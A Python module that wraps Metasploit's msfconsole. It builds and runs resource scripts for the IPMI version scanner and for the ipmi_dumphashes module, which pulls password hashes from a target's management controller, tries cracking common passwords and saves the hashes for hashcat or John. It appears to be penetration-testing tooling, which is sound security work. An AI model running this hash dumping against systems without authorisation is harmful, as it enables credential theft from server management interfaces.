from __future__ import annotations

import shutil
import tempfile
from pathlib import Path

from ..models import CommandSpec, CommandResult
from ..core.runner import CommandRunner
from ..core.errors import ToolMissingError


class MetasploitTool:
    name = "metasploit"

    def __init__(self, runner: CommandRunner) -> None:
        self._runner = runner
        self._rc_dir = Path(tempfile.mkdtemp(prefix="ipmi_msf_"))

    def check_available(self) -> bool:
        return shutil.which("msfconsole") is not None

    def _write_rc(self, name: str, lines: list[str]) -> Path:
        rc_path = self._rc_dir / f"{name}.rc"
        rc_path.write_text("\n".join(lines) + "\n", encoding="utf-8")
        return rc_path

    def build_version_command(self, target: str, port: int = 623) -> CommandSpec:
        rc_path = self._write_rc("ipmi_version", [
            "use auxiliary/scanner/ipmi/ipmi_version",
            f"set RHOSTS {target}",
            f"set RPORT {port}",
            "set THREADS 1",
            "run",
            "exit -y",
        ])
        return CommandSpec(
            tool_name="msfconsole",
            argv=["msfconsole", "-q", "-r", str(rc_path)],
            timeout_seconds=120,
        )

    def run_version(self, target: str, port: int = 623,
                    stdout_path: Path | None = None, stderr_path: Path | None = None) -> CommandResult:
        if not self.check_available():
            raise ToolMissingError("msfconsole")
        spec = self.build_version_command(target, port)
        return self._runner.run(spec, stdout_path=stdout_path, stderr_path=stderr_path)

    def build_dumphashes_command(
        self,
        target: str,
        port: int = 623,
        user_file: Path | None = None,
        hashcat_file: Path | None = None,
        john_file: Path | None = None,
        crack_common: bool = True,
    ) -> CommandSpec:
        lines = [
            "use auxiliary/scanner/ipmi/ipmi_dumphashes",
            f"set RHOSTS {target}",
            f"set RPORT {port}",
            f"set CRACK_COMMON {str(crack_common).lower()}",
            "set THREADS 1",
        ]
        if user_file and user_file.exists():
            lines.append(f"set USER_FILE {user_file}")
        if hashcat_file:
            hashcat_file.parent.mkdir(parents=True, exist_ok=True)
            lines.append(f"set OUTPUT_HASHCAT_FILE {hashcat_file}")
        if john_file:
            john_file.parent.mkdir(parents=True, exist_ok=True)
            lines.append(f"set OUTPUT_JOHN_FILE {john_file}")
        lines += ["run", "exit -y"]

        rc_path = self._write_rc("ipmi_dumphashes", lines)
        return CommandSpec(
            tool_name="msfconsole",
            argv=["msfconsole", "-q", "-r", str(rc_path)],
            timeout_seconds=300,
        )

    def run_dumphashes(
        self,
        target: str,
        port: int = 623,
        user_file: Path | None = None,
        hashcat_file: Path | None = None,
        john_file: Path | None = None,
        crack_common: bool = True,
        stdout_path: Path | None = None,
        stderr_path: Path | None = None,
    ) -> CommandResult:
        if not self.check_available():
            raise ToolMissingError("msfconsole")
        spec = self.build_dumphashes_command(
            target, port, user_file, hashcat_file, john_file, crack_common
        )
        return self._runner.run(spec, stdout_path=stdout_path, stderr_path=stderr_path)
